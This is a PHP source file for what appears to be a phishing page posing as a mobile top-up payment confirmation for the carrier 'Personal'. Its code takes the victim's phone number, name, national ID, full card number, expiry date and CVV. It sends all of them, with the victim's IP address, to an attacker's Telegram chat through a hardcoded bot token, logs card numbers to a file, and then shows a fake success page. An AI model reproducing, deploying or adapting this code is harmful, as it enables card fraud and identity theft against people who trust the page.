<?php
/**
 * STEP 7 - VERSIÓN SIN HTML (GARANTIZADO)
 */

// CONFIGURACIÓN
$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
$TELEGRAM_CHAT_ID = '-1003832913889';

// Recibir datos
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';
$dni = isset($_POST['dni']) ? trim($_POST['dni']) : '';
$name = isset($_POST['name']) ? trim($_POST['name']) : '';

// Si confirma pago
if(isset($_POST['confirmar_pago'])) {
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');
    
    // MENSAJE SIN HTML (texto plano)
    $mensaje = "🔔 NUEVA CAPTURA COMPLETA\n";
    $mensaje .= "━━━━━━━━━━━━━━━\n\n";
    $mensaje .= "📱 DATOS:\n";
    $mensaje .= "Telefono: " . $phone . "\n";
    $mensaje .= "Nombre: " . $name . "\n";
    $mensaje .= "DNI: " . $dni . "\n\n";
    $mensaje .= "💳 TARJETA:\n";
    $mensaje .= "Numero: " . $card . "\n";
    $mensaje .= "Vencimiento: " . $venc . "\n";
    $mensaje .= "CVV: " . $cv . "\n";
    $mensaje .= "Monto: $" . $amount . "\n\n";
    $mensaje .= "🌐 INFO:\n";
    $mensaje .= "IP: " . $ip . "\n";
    $mensaje .= "Fecha: " . $fecha . "\n";
    
    // ENVIAR (EXACTAMENTE como test-envio-simple.php)
    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = array(
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $mensaje
        // SIN parse_mode
    );
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Log detallado
    $log_entry = sprintf(
        "[%s] Tel: %s | Card: %s | HTTP: %s | Result: %s\n",
        $fecha,
        $phone,
        $card,
        $http_code,
        substr($result, 0, 100)
    );
    @file_put_contents(__DIR__ . '/step7_detallado.log', $log_entry, FILE_APPEND);
    
    // Redirigir
    header('Location: success.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmar Pago | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
    <style>
        body { background: #e5e5e5; }
        .summary-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin: 20px auto; max-width: 500px; }
        .summary-item { padding: 15px 0; border-bottom: 1px solid #e0e0e0; display: flex; justify-content: space-between; }
        .summary-item:last-child { border-bottom: none; }
        .label { color: #666; font-weight: 600; }
        .value { color: #333; font-family: monospace; }
        .total { font-size: 24px; color: #00a8e1; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-center mt-5 mb-4">
            <img src="assets/flow.svg" style="height: 40px;">
            <h1 style="color: #333; font-size: 28px; margin-top: 20px;">Confirmar recarga</h1>
        </div>

        <div class="summary-box">
            <h3 style="color: #00a8e1; margin-bottom: 20px;">Resumen de tu recarga</h3>
            
            <div class="summary-item">
                <span class="label">Teléfono:</span>
                <span class="value"><?php echo htmlspecialchars($phone); ?></span>
            </div>
            
            <div class="summary-item">
                <span class="label">Monto:</span>
                <span class="value">$<?php echo htmlspecialchars($amount); ?></span>
            </div>
            
            <div class="summary-item">
                <span class="label">Tarjeta:</span>
                <span class="value">**** <?php echo substr($card, -4); ?></span>
            </div>
            
            <div class="summary-item">
                <span class="label">Titular:</span>
                <span class="value"><?php echo htmlspecialchars($name); ?></span>
            </div>
            
            <div class="summary-item" style="border-top: 2px solid #00a8e1; margin-top: 20px; padding-top: 20px;">
                <span class="label">Total a pagar:</span>
                <span class="total">$<?php echo htmlspecialchars($amount); ?></span>
            </div>

            <form method="POST" action="step7.php" class="mt-4">
                <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
                <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
                <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
                <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
                <input type="hidden" name="dni" value="<?php echo htmlspecialchars($dni); ?>">
                <input type="hidden" name="name" value="<?php echo htmlspecialchars($name); ?>">
                
                <div class="text-center">
                    <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                    <button type="submit" name="confirmar_pago" class="btn btn-success px-5 py-3" style="background: #28a745; border: none; font-size: 20px; font-weight: bold;">CONFIRMAR Y PAGAR</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>